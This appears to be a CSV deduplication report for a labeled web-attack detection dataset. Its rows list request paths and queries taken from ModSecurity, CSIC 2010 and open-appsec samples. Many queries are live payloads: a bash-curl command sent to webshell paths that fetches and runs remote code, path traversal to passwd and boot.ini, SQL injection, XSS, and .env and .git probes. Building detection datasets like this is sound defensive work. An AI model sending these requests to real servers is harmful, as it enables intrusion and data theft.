"hash_type","hash","rows","labels","sources","notes","sample_ids","sample_method","sample_path","sample_query"
"canonical_raw_request_hash","6feebced477bb9c0fbe0a496","4","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000050|pos_owasp_modsec_000078|pos_owasp_modsec_001781|pos_owasp_modsec_002571","GET","/d_873adb73/d_42a4d7a0/d_3e6ca509/webshell.php","action=exec&cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","7638b0658c1318d59b5cb1be","4","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_002937|pos_owasp_modsec_001783|pos_owasp_modsec_001307|pos_owasp_modsec_002419","GET","/d_eda37985/d_3487ae30/mod_webshell.php","action=exec&cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","82a1042bee9b04022d693a47","4","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_001816|pos_owasp_modsec_000365|pos_owasp_modsec_000832|pos_owasp_modsec_000049","GET","/exec.php","exec=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","90262c08e5ff08e1878d9bcb","4","1","owasp_modsecurity","owasp_sqli:942100","pos_owasp_modsec_002188|pos_owasp_modsec_002785|pos_owasp_modsec_000073|pos_owasp_modsec_000987","POST","/wp-login.php","action=lostpassword"
"canonical_raw_request_hash","99f20ebb36bcee703458340f","4","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_001773|pos_owasp_modsec_002923|pos_owasp_modsec_002609|pos_owasp_modsec_001141","GET","/d_44424c43/d_e6bf6bfb/d_253a0127/d_f82440d4/d_628ea0d7/block_rce.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","b32a3459421788b5b82266ee","4","1","owasp_modsecurity","owasp_xss:920450","pos_owasp_modsec_000836|pos_owasp_modsec_001998|pos_owasp_modsec_002148|pos_owasp_modsec_001717","GET","/d_aef1eb87/d_26833b49/d_69e31438/d_7f42b05b/pum-site-scripts.js",""
"canonical_raw_request_hash","b75d8552257610df8bf5c385","4","1","csic_2010","csic_anomalous","pos_csic_002204|pos_csic_000921|pos_csic_001934|pos_csic_000673","GET","/tienda1.Old",""
"canonical_raw_request_hash","c5c08b50e1d7842daa78b909","4","1","owasp_modsecurity","owasp_sqli:932115|owasp_sqli:942100","pos_owasp_modsec_001757|pos_owasp_modsec_000019|pos_owasp_modsec_001934|pos_owasp_modsec_001588","POST","/wp-login.php","reauth=1&redirect_to=https://df7754e.hu/wp-admin/"
"canonical_raw_request_hash","07a8a7cab650a725d326fc9c","3","1","csic_2010","csic_anomalous","pos_csic_002518|pos_csic_002854|pos_csic_000315","GET","/tienda1/publico/anadir.jsp.java",""
"canonical_raw_request_hash","250bd34534f1beb815813160","3","1","owasp_modsecurity","owasp_rce:932150","pos_owasp_modsec_002136|pos_owasp_modsec_000491|pos_owasp_modsec_000553","POST","/wp-plain.php",""
"canonical_raw_request_hash","32ad66fbff194f3faf1a5dea","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002956|norm_modsec_learn_000835|norm_modsec_learn_000834","GET","/","key=PRESENT"
"canonical_raw_request_hash","497e214db604927409768c6f","3","1","owasp_modsecurity","owasp_xss:920450","pos_owasp_modsec_002825|pos_owasp_modsec_002252|pos_owasp_modsec_002455","GET","/isotope.js",""
"canonical_raw_request_hash","5fc200d44f3194b7e9e6ffea","3","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_001994|pos_owasp_modsec_001065|pos_owasp_modsec_001537","GET","/d_3b1ec613/d_bd205cb5/gzdecodes.php",""
"canonical_raw_request_hash","95d8a4faafebe07c16c51dc2","3","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000663|pos_owasp_modsec_001449|pos_owasp_modsec_001369","GET","/d_1dfbfc8b/d_ebec15cd/d_eda37985/d_9a52310f/d_a9b36e7e/shell.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","c982bd8039f13972a33db411","3","1","owasp_modsecurity","owasp_xss:933110","pos_owasp_modsec_000375|pos_owasp_modsec_001074|pos_owasp_modsec_001353","POST","/d_21316fde/d_5737eae1/class-plugin-installer-skin-wp.php","beta=my-db.com/3"
"canonical_raw_request_hash","cc6ba957f2fdc88ed96853bb","3","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000169|pos_owasp_modsec_001701|pos_owasp_modsec_001399","GET","/d_eda37985/d_4ed974d3/d_64c9c797/shell.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","e345453ef3647f8546103af7","3","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000258|pos_owasp_modsec_002413|pos_owasp_modsec_000728","GET","/d_eda37985/d_4ff6ca68/d_4ff6ca68/shell.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","e44f85f8ffeb005958509eca","3","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_002412|pos_owasp_modsec_000612|pos_owasp_modsec_001900","GET","/cmd.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","e8f504d40eb0da4a7f54129c","3","1","csic_2010","csic_anomalous","pos_csic_001635|pos_csic_002393|pos_csic_000741","GET","/.jsp",""
"canonical_raw_request_hash","03aa0b2f3dfd1945ce5f4615","2","1","owasp_modsecurity","owasp_rce:932150","pos_owasp_modsec_000352|pos_owasp_modsec_001908","POST","/wp-plain.php",""
"canonical_raw_request_hash","05a8e8de967accf8845f7729","2","1","csic_2010","csic_anomalous","pos_csic_002678|pos_csic_001231","POST","/tienda1/publico/caracteristicas.jsp",""
"canonical_raw_request_hash","0e6d09b7047d7d06c4ee3c91","2","1","owasp_modsecurity","owasp_rce:932150","pos_owasp_modsec_000305|pos_owasp_modsec_002606","POST","/wp-plain.php",""
"canonical_raw_request_hash","0e9feb05878b2f307f4488d6","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001100|norm_modsec_learn_001715","GET","/","v=6434&nid=2149&put=k-lxxHgrZUbJO_PUPloiptXoiUjmrc5aLTjZFf8A&expires=30"
"canonical_raw_request_hash","1cf83d2fc04f02880adfc56e","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001203|norm_modsec_learn_001828","GET","/","appVersion=953&experienceVersion=953&uxid=com.nike.commerce.nikedotcom.web&locale=en_IL&backendEnvironment=identity&browser=Google%20Inc.&os=undefined&mobile=false&native=false&visit=1&visitor=2bac7ee2-6167-4dd0-9152-f278d455aec7&upmId=ffa85996-ca6e-4340-8463-aabd984bf5ac"
"canonical_raw_request_hash","2568bef9798b4b65dd1de037","2","1","csic_2010","csic_anomalous","pos_csic_001048|pos_csic_001266","GET","/IISSamples/sdk/asp/applications/Application_VBScript.asp",""
"canonical_raw_request_hash","3485c4bc57572e763e97dcce","2","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_001445|pos_owasp_modsec_000694","GET","/wp-includesSimplePiegzdecodes.php",""
"canonical_raw_request_hash","374b39195bcf8417e62538e4","2","1","openappsec_malicious","traversal","pos_malicious_002508|pos_malicious_002380","GET","/","p=.%00.%c1%af.%00.%c1%afboot.ini"
"canonical_raw_request_hash","391c797044f710201d23450f","2","1","openappsec_malicious","traversal","pos_malicious_002377|pos_malicious_002481","GET","/","p=.%00.%c0%af.%00.%c0%af.%00.%c0%afetc%c0%afissue"
"canonical_raw_request_hash","43353d1874d46567dcc2ce1c","2","1","csic_2010","csic_anomalous","pos_csic_002759|pos_csic_001116","POST","/tienda1/publico/caracteristicas.jsp",""
"canonical_raw_request_hash","44d22ef0d362e22c6e978a0c","2","1","owasp_modsecurity","owasp_xss:930130","pos_owasp_modsec_000345|pos_owasp_modsec_000535","GET","/apps/.env",""
"canonical_raw_request_hash","4ae99d79f4ddc8f1224b8e1b","2","1","openappsec_malicious","traversal","pos_malicious_003001|pos_malicious_003025","GET","/","p=..%01%c1%9c..%01%c1%9c..%01%c1%9c..%01%c1%9c..%01%c1%9c..%01%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts"
"canonical_raw_request_hash","51aa59e308837b906b9895c5","2","1","owasp_modsecurity","owasp_xss:920450","pos_owasp_modsec_000440|pos_owasp_modsec_002587","GET","/asp.js",""
"canonical_raw_request_hash","52e5ea7bd5805dd364785de7","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001789|norm_modsec_learn_001180","GET","/","a=135092800&sa=1&v=1215.1253ab8&t=Unnamed%20Transaction&rst=69525&ck=1&ref=https://www.nike.com/il/member/profile/login&ri=%7B%22web-shell-client%22:%221.39.0%22,%22shopClient%22:%221.133.0%22%7D"
"canonical_raw_request_hash","55eccedf499a9d961f6041d6","2","1","owasp_modsecurity","owasp_lfi_rfi:920450|owasp_lfi_rfi:930130","pos_owasp_modsec_002848|pos_owasp_modsec_002415","GET","/.git/config",""
"canonical_raw_request_hash","5ff42fccd0b7b99d003870a0","2","1","owasp_modsecurity","owasp_xss:920450","pos_owasp_modsec_000147|pos_owasp_modsec_001610","GET","/d_8fd53753/d_26833b49/d_06c4c830/d_6283da6e/d_a7ea22f1/d_57982a55/d_f7188394/script.min.js",""
"canonical_raw_request_hash","65672c1f7690878081a60baa","2","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_001006|pos_owasp_modsec_002786","GET","/d_3b1ec613/d_bd205cb5/gzdecodes.php",""
"canonical_raw_request_hash","6940ce0172956da23cb52c55","2","1","owasp_modsecurity","owasp_xss:930130","pos_owasp_modsec_002456|pos_owasp_modsec_002515","GET","/.env.example",""
"canonical_raw_request_hash","6b96dc17dd5792166f756bdd","2","1","csic_2010","csic_anomalous","pos_csic_001072|pos_csic_000659","GET","/tienda1/global/estilos.css.inc",""
"canonical_raw_request_hash","702d2b4b8a357fe17f6fce0e","2","1","owasp_modsecurity","owasp_xss:930130","pos_owasp_modsec_002800|pos_owasp_modsec_002884","GET","/.env.prod",""
"canonical_raw_request_hash","736aaa50207bd2140a29a1b0","2","1","csic_2010","csic_anomalous","pos_csic_001756|pos_csic_002699","GET","/tienda1.inc",""
"canonical_raw_request_hash","7377d46661b580b7652ac8be","2","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_001949|pos_owasp_modsec_000132","GET","/d_e6bf6bfb/d_253a0127/d_f82440d4/d_628ea0d7/block_rce.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"canonical_raw_request_hash","7619f804d9e288b17312a169","2","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_000230|pos_owasp_modsec_000761","GET","/d_3b1ec613/d_bd205cb5/gzdecodes.php",""
"canonical_raw_request_hash","7830ff6c64332e07acfd7c54","2","1","openappsec_malicious","traversal","pos_malicious_003022|pos_malicious_002998","GET","/","p=..%01%c1%af..%01%c1%af..%01%c1%af..%01%c1%af..%01%c1%af..%01%c1%afboot.ini"
"canonical_raw_request_hash","7be2e39282cba9301a62f68b","2","1","csic_2010","csic_anomalous","pos_csic_001929|pos_csic_001253","GET","/WebSphereSamples/SingleSamples/Increment/increment.html",""
"canonical_raw_request_hash","7f6c3c51d8247d19e3f4166e","2","1","owasp_modsecurity","owasp_lfi_rfi:930130","pos_owasp_modsec_001024|pos_owasp_modsec_000870","GET","/.env",""
"canonical_raw_request_hash","808b68b9d21fb365018a8b11","2","1","csic_2010","csic_anomalous","pos_csic_000306|pos_csic_002519","POST","/tienda1/publico/vaciar.jsp",""
"canonical_raw_request_hash","83c2d6fe536e935191b8e79e","2","1","csic_2010","csic_anomalous","pos_csic_002629|pos_csic_000026","GET","/tienda1/publico/caracteristicas.jsp","id=1%2520"
"canonical_raw_request_hash","87a3ef083316e782765e453d","2","1","csic_2010","csic_anomalous","pos_csic_000120|pos_csic_001738","PUT","/tienda1/publico/caracteristicas.jsp",""
"canonical_raw_request_hash","898aba91ec0a3f8d61ea2c54","2","1","csic_2010","csic_anomalous","pos_csic_002546|pos_csic_001464","GET","/4861362529278789730",""
"canonical_raw_request_hash","8f77cc77d97b5ac06a37a8b5","2","1","csic_2010","csic_anomalous","pos_csic_001571|pos_csic_002725","GET","/",""
"canonical_raw_request_hash","8f9054b12e505efd2fb136b3","2","1","csic_2010","csic_anomalous","pos_csic_001523|pos_csic_001551","GET","/tienda1/publico/vaciar.jsp","B2=%2520"
"canonical_raw_request_hash","9186324ee36123729f65a578","2","1","owasp_modsecurity","owasp_sqli:942100","pos_owasp_modsec_001897|pos_owasp_modsec_002459","POST","/","wc-ajax=add_to_cart"
"canonical_raw_request_hash","92a410d34093750121c1ec57","2","1","owasp_modsecurity","owasp_xss:930130","pos_owasp_modsec_000251|pos_owasp_modsec_000224","GET","/wordpress/.git/config",""
"canonical_raw_request_hash","996463a2144af119488e4380","2","0","csic_2010","csic_normal","norm_csic_002635|norm_csic_001805","POST","/tienda1/publico/anadir.jsp",""
"canonical_raw_request_hash","9c1c1c02e2b63906c13e913c","2","1","owasp_modsecurity","owasp_lfi_rfi:930130","pos_owasp_modsec_001448|pos_owasp_modsec_001512","GET","/.env",""
"canonical_raw_request_hash","9d34e68a2f74ab9aace54946","2","1","csic_2010","csic_anomalous","pos_csic_000984|pos_csic_002861","GET","/tienda1/asf-logo-wide.gif/",""
"canonical_raw_request_hash","a378e224b74742fda2b31994","2","1","openappsec_malicious","traversal","pos_malicious_002506|pos_malicious_002378","GET","/","p=.%00.%c1%af.%00.%c1%af.%00.%c1%afetc%c1%afpasswd"
"canonical_raw_request_hash","a48c2b80d2f6051e68555e3f","2","1","owasp_modsecurity","owasp_xss:930130","pos_owasp_modsec_001222|pos_owasp_modsec_002447","GET","/api/.env",""
"canonical_raw_request_hash","a75159c2a3fe04095e06984d","2","1","csic_2010","csic_anomalous|csic_xss","pos_csic_001708|pos_csic_000190","GET","/tienda1/publico/vaciar.jsp","B2=Vaciar+carrito%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E"
"canonical_raw_request_hash","a82071bf4c5a8ad64e35339b","2","1","csic_2010","csic_anomalous|csic_xss","pos_csic_001489|pos_csic_001907","GET","/tienda1/publico/vaciar.jsp","B2=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org"
"canonical_raw_request_hash","b29c320859beab99920205ad","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002743|norm_modsec_learn_002974","GET","/","stm=1662447989854"
"canonical_raw_request_hash","b86ada97c12960e925d72693","2","1","owasp_modsecurity","owasp_php_injection:933100","pos_owasp_modsec_001034|pos_owasp_modsec_002006","POST","/wp-login.php",""
"canonical_raw_request_hash","be7faa64ab3255fc311a82ec","2","1","csic_2010","csic_anomalous|csic_xss","pos_csic_002235|pos_csic_001674","POST","/tienda1/publico/caracteristicas.jsp",""
"canonical_raw_request_hash","c111a6b469efa586bcf87bf1","2","1","csic_2010","csic_crlf","pos_csic_002287|pos_csic_000684","POST","/tienda1/publico/entrar.jsp",""
"canonical_raw_request_hash","c27f91a632efe0101ca71fff","2","1","openappsec_malicious","sqli","pos_malicious_001342|pos_malicious_001335","GET","/","p=1%20uNIoN%28sEleCT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29"
"canonical_raw_request_hash","c72543e9c8b2731cfb7af1e4","2","1","csic_2010","csic_anomalous","pos_csic_001445|pos_csic_002553","GET","/tienda1/global/estilos.css.Old",""
"canonical_raw_request_hash","d166325a369f1e2d71b26499","2","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_000312|pos_owasp_modsec_000201","GET","/d_3b1ec613/d_bd205cb5/gzdecodes.php.suspected",""
"canonical_raw_request_hash","d332bc301f24f7855846c6f6","2","1","owasp_modsecurity","owasp_rce:932150","pos_owasp_modsec_002345|pos_owasp_modsec_001745","POST","/wp-plain.php",""
"canonical_raw_request_hash","d4aa33e081ccb6bf99a55c9d","2","1","owasp_modsecurity","owasp_sqli:942100","pos_owasp_modsec_001803|pos_owasp_modsec_002961","POST","/contactus.php",""
"canonical_raw_request_hash","d7f19fc0491e30f31dbd4349","2","1","csic_2010","csic_anomalous","pos_csic_000767|pos_csic_001491","GET","/tienda1/publico/entrar.jsp","errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--"
"canonical_raw_request_hash","d91aadcddc0c4d1f966d0c23","2","1","csic_2010","csic_anomalous","pos_csic_001003|pos_csic_000865","POST","/tienda1/publico/caracteristicas.jsp",""
"canonical_raw_request_hash","db94e92d7515e6eb3ac14b04","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002388|norm_modsec_learn_000090","GET","/","cb=31068870"
"canonical_raw_request_hash","de000d1bb91744c0b196d517","2","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_001667|pos_owasp_modsec_001480","GET","/d_3b1ec613/d_bd205cb5/gzdecodes.php",""
"canonical_raw_request_hash","e338d2a2e1f123c8bd4fff8b","2","1","owasp_modsecurity","owasp_php_injection:933150","pos_owasp_modsec_001106|pos_owasp_modsec_002803","GET","/d_3b1ec613/d_bd205cb5/gzdecodes.php.suspected",""
"canonical_raw_request_hash","e70e64ab742cacd55d64b0ec","2","1","openappsec_malicious","traversal","pos_malicious_002488|pos_malicious_002512","GET","/","p=.%00.%c1%9cboot.ini"
"canonical_raw_request_hash","e812a3145dc8bdd270982a33","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001101|norm_modsec_learn_002861","GET","/","v=9-32680a36db&secure=1&cachedVariantChoices=W10-&isPurposePreview=0&eventMetadataExperiment=newMeta&inmobi=0"
"canonical_raw_request_hash","ee8c8b5e6c56829878e35eb0","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002958|norm_modsec_learn_000266","GET","/","name=1658754074794&target=OPTIMIZATION_TARGET_LANGUAGE_DETECTION"
"canonical_raw_request_hash","f7c51f18f65ddce22abdb2a1","2","1","openappsec_malicious","traversal","pos_malicious_003040|pos_malicious_002912","GET","/","p=..%01%c1%af..%01%c1%afetc%c1%afpasswd"
"canonical_raw_request_hash","f862a685a1c484956aecc561","2","1","exploitdb","lfi","pos_luongvd_000879|pos_luongvd_000880","GET","/foobar/..\..\..\..\..\..\boot.ini",""
"canonical_raw_request_hash","f8cb8aeac21e9798dc42b175","2","1","owasp_modsecurity","owasp_rce:932150","pos_owasp_modsec_002204|pos_owasp_modsec_000309","GET","/ogqrfwnp.php","Fox=d3wL7"
"canonical_raw_request_hash","f8e69af1aea75593166bf8b2","2","1","owasp_modsecurity","owasp_php_injection:933100|owasp_sqli:942100","pos_owasp_modsec_000134|pos_owasp_modsec_002294","POST","/wp-login.php",""
"canonical_raw_request_hash","f960ba264ad6165ea39b874e","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001791|norm_modsec_learn_001183","GET","/","a=138609390&sa=1&v=1215.1253ab8&t=Unnamed%20Transaction&rst=4116&ck=1&ref=https://www.nike.com/il/cart&be=639&fe=4079&dc=1322&af=err,xhr,stn,ins,spa&perf=%7B%22timing%22:%7B%22of%22:1660541229141,%22n%22:0,%22u%22:616,%22ue%22:616,%22f%22:2,%22dn%22:2,%22dne%22:2,%22c%22:6,%22s%22:325,%22ce%22:327,%"
"canonical_raw_request_hash","fc1ade207236f1f648bb5c7c","2","1","openappsec_malicious","traversal","pos_malicious_002911|pos_malicious_003015","GET","/","p=..%01%c0%af..%01%c0%afetc%c0%afissue"
